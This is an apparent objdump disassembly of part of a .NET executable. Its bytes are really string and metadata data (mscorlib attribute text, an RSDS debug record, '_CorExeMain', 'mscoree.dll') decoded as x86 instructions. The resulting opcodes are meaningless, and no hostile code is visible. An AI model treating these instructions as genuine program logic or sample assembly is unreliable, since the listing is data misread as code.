  408df3:	popa   
  408df4:	xor    dh,BYTE PTR [ecx]
  408df6:	xor    BYTE PTR [esi],dh
  408df8:	popa   
  408df9:	bound  esi,QWORD PTR fs:[esi]
  408dfc:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  408e00:	xor    esi,DWORD PTR [ebx]
  408e02:	xor    eax,0x65663039
  408e07:	data16 cmp BYTE PTR [ecx+0x64],ah
  408e0b:	xor    eax,0x63333463
  408e10:	bound  esp,QWORD PTR [ecx+0x38]
  408e13:	xor    dh,BYTE PTR [edx]
  408e15:	cmp    DWORD PTR [eax],esi
  408e17:	arpl   WORD PTR fs:[ecx+edi*1],si
  408e1b:	xor    eax,0x66653033
  408e20:	data16 cmp BYTE PTR fs:[esi],dh
  408e24:	xor    eax,0x39643332
  408e29:	xor    al,0x38
  408e2b:	xor    esp,DWORD PTR [ebx+0x30]
  408e2e:	xor    BYTE PTR [esi+0x34],ah
  408e31:	xor    eax,0x34666138
  408e36:	cmp    BYTE PTR ss:[ecx],bh
  408e39:	xor    BYTE PTR [eax],dh
  408e3b:	xor    esi,DWORD PTR [esi]
  408e3d:	bound  esi,QWORD PTR [eax]
  408e3f:	xor    ah,BYTE PTR gs:[ebx+0x36]
  408e43:	xor    DWORD PTR [eax+esi*1+0x37],esp
  408e47:	aaa    
  408e48:	fs aaa 
  408e4a:	bound  sp,DWORD PTR [ecx+0x63]
  408e4e:	xor    al,0x36
  408e50:	aaa    
  408e51:	popa   
  408e52:	xor    eax,0x62653630
  408e57:	popa   
  408e58:	xor    bh,BYTE PTR [ecx]
  408e5a:	gs xor al,0x36
  408e5d:	aaa    
  408e5e:	popa   
  408e5f:	cmp    BYTE PTR [edi],dh
  408e61:	xor    DWORD PTR [ecx],edi
  408e63:	cmp    BYTE PTR [edx+0x30],ah
  408e66:	xor    eax,0x34376333
  408e6b:	cmp    DWORD PTR [ecx+0x61],esp
  408e6e:	xor    ah,BYTE PTR [ecx+0x34]
  408e71:	xor    bh,BYTE PTR fs:[eax]
  408e74:	xor    al,0x30
  408e76:	arpl   WORD PTR [edi],si
  408e78:	cmp    BYTE PTR [eiz*2+0x6436],dh
  408e7f:	push   ds
  408e80:	add    DWORD PTR [eax],eax
  408e82:	add    DWORD PTR [eax],eax
  408e84:	push   esp
  408e85:	add    dl,BYTE PTR [esi]
  408e87:	push   edi
  408e88:	jb     0x408eeb
  408e8a:	jo     0x408eda
  408e8c:	outs   dx,DWORD PTR ds:[esi]
  408e8d:	outs   dx,BYTE PTR ds:[esi]
  408e8e:	inc    ebp
  408e8f:	js     0x408ef4
  408e91:	gs jo  0x408f08
  408e94:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  408e9b:	ja     0x408f10
  408e9d:	add    DWORD PTR [eax],ecx
  408e9f:	add    DWORD PTR [eax],eax
  408ea1:	add    al,BYTE PTR [eax]
  408ea3:	add    BYTE PTR [eax],al
  408ea5:	add    BYTE PTR [eax],al
  408ea7:	or     BYTE PTR [ecx],al
  408ea9:	add    BYTE PTR [eax],cl
  408eab:	add    BYTE PTR [eax],al
  408ead:	add    BYTE PTR [eax],al
  408eaf:	add    BYTE PTR [ecx-0x7ffdd1da],al
  408eb5:	test   BYTE PTR [ebx+0x79],dl
  408eb8:	jae    0x408f2e
  408eba:	gs ins DWORD PTR es:[edi],dx
  408ebc:	cs push ebx
  408ebe:	arpl   WORD PTR gs:[ebp+0x72],si
  408ec2:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  408eca:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  408ed1:	cs push ebx
  408ed3:	arpl   WORD PTR gs:[ebp+0x72],si
  408ed7:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  408edf:	jae    0x408f54
  408ee1:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408ee8:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  408eef:	ins    DWORD PTR es:[edi],dx
  408ef0:	jae    0x408f55
  408ef2:	outs   dx,DWORD PTR ds:[esi]
  408ef3:	jb     0x408f61
  408ef5:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  408efc:	jae    0x408f67
  408efe:	outs   dx,DWORD PTR ds:[esi]
  408eff:	outs   dx,BYTE PTR ds:[esi]
  408f00:	cmp    eax,0x2e302e34
  408f05:	xor    BYTE PTR [esi],ch
  408f07:	xor    BYTE PTR [eax+eiz*1],ch
  408f0a:	inc    ebx
  408f0b:	jne    0x408f79
  408f0d:	je     0x408f84
  408f0f:	jb     0x408f76
  408f11:	cmp    eax,0x7475656e
  408f16:	jb     0x408f79
  408f18:	ins    BYTE PTR es:[edi],dx
  408f19:	sub    al,0x20
  408f1b:	push   eax
  408f1c:	jne    0x408f80
  408f1e:	ins    BYTE PTR es:[edi],dx
  408f1f:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408f26:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408f2a:	bound  esi,QWORD PTR [edi]
  408f2c:	aaa    
  408f2d:	popa   
  408f2e:	xor    eax,0x31363563
  408f33:	cmp    DWORD PTR [ebx],esi
  408f35:	xor    al,0x65
  408f37:	xor    BYTE PTR [eax],bh
  408f39:	cmp    DWORD PTR [ecx],eax
  408f3b:	add    BYTE PTR [eax+0x73795384],al
  408f41:	je     0x408fa8
  408f43:	ins    DWORD PTR es:[edi],dx
  408f44:	cs push ebx
  408f46:	arpl   WORD PTR gs:[ebp+0x72],si
  408f4a:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  408f52:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  408f59:	cs push ebx
  408f5b:	arpl   WORD PTR gs:[ebp+0x72],si
  408f5f:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  408f67:	jae    0x408fdc
  408f69:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408f70:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  408f77:	ins    DWORD PTR es:[edi],dx
  408f78:	jae    0x408fdd
  408f7a:	outs   dx,DWORD PTR ds:[esi]
  408f7b:	jb     0x408fe9
  408f7d:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  408f84:	jae    0x408fef
  408f86:	outs   dx,DWORD PTR ds:[esi]
  408f87:	outs   dx,BYTE PTR ds:[esi]
  408f88:	cmp    eax,0x2e302e34
  408f8d:	xor    BYTE PTR [esi],ch
  408f8f:	xor    BYTE PTR [eax+eiz*1],ch
  408f92:	inc    ebx
  408f93:	jne    0x409001
  408f95:	je     0x40900c
  408f97:	jb     0x408ffe
  408f99:	cmp    eax,0x7475656e
  408f9e:	jb     0x409001
  408fa0:	ins    BYTE PTR es:[edi],dx
  408fa1:	sub    al,0x20
  408fa3:	push   eax
  408fa4:	jne    0x409008
  408fa6:	ins    BYTE PTR es:[edi],dx
  408fa7:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  408fae:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408fb2:	bound  esi,QWORD PTR [edi]
  408fb4:	aaa    
  408fb5:	popa   
  408fb6:	xor    eax,0x31363563
  408fbb:	cmp    DWORD PTR [ebx],esi
  408fbd:	xor    al,0x65
  408fbf:	xor    BYTE PTR [eax],bh
  408fc1:	cmp    DWORD PTR ds:0x10025401,edx
  408fc7:	push   ebx
  408fc8:	imul   ebp,DWORD PTR [ecx+0x70],0x56
  408fcc:	gs jb  0x409038
  408fcf:	imul   sp,WORD PTR [ebx+0x61],0x6974
  408fd5:	outs   dx,DWORD PTR ds:[esi]
  408fd6:	outs   dx,BYTE PTR ds:[esi]
  408fd7:	add    DWORD PTR [eax],eax
  408fd9:	add    BYTE PTR [eax],al
  408fdb:	add    ah,cl
  408fdd:	pop    ebx
  408fde:	cli    
  408fdf:	dec    edi
  408fe0:	add    BYTE PTR [eax],al
  408fe2:	add    BYTE PTR [eax],al
  408fe4:	add    al,BYTE PTR [eax]
  408fe6:	add    BYTE PTR [eax],al
  408fe8:	sub    DWORD PTR [eax],eax
  408fea:	add    BYTE PTR [eax],al
  408fec:	hlt    
  408fed:	pop    DWORD PTR [eax]
  408fef:	add    ah,dh
  408ff1:	jno    0x408ff3
  408ff3:	add    BYTE PTR [edx+0x53],dl
  408ff6:	inc    esp
  408ff7:	push   ebx
  408ff8:	mov    dl,0x45
  408ffa:	xor    esi,DWORD PTR [ecx]
  408ffc:	daa    
  408ffd:	aam    0xef
  408fff:	dec    esp
  409000:	mov    DWORD PTR [ebx],esp
  409002:	xor    BYTE PTR [esi],0x75
  409005:	xchg   ebp,eax
  409006:	pop    ds
  409007:	mov    esi,0x1
  40900c:	dec    ebp
  40900d:	ins    DWORD PTR es:[di],dx
  40900f:	je     0x409054
  409011:	ins    BYTE PTR es:[edi],dx
  409012:	popa   
  409013:	jae    0x409088
  409015:	inc    edi
  409016:	outs   dx,BYTE PTR gs:[esi]
  409018:	cs jo  0x40907f
  40901b:	bound  eax,QWORD PTR [eax]
	...
  40910d:	add    BYTE PTR [eax],al
  40910f:	add    BYTE PTR [eax],bh
  409111:	xchg   ecx,eax
	...
  40911a:	add    BYTE PTR [eax],al
  40911c:	dec    esi
  40911d:	xchg   ecx,eax
  40911e:	add    BYTE PTR [eax],al
  409120:	add    BYTE PTR [eax],ah
	...
  409136:	add    BYTE PTR [eax],al
  409138:	inc    eax
  409139:	xchg   ecx,eax
	...
  409142:	pop    edi
  409143:	inc    ebx
  409144:	outs   dx,DWORD PTR ds:[esi]
  409145:	jb     0x40918c
  409147:	js     0x4091ae
  409149:	dec    ebp
  40914a:	popa   
  40914b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  409152:	jb     0x4091b9
  409154:	gs cs fs ins BYTE PTR es:[edi],dx
  409158:	ins    BYTE PTR es:[edi],dx
  409159:	add    BYTE PTR [eax],al
  40915b:	add    BYTE PTR [eax],al
  40915d:	add    bh,bh
  40915f:	and    eax,0x402000
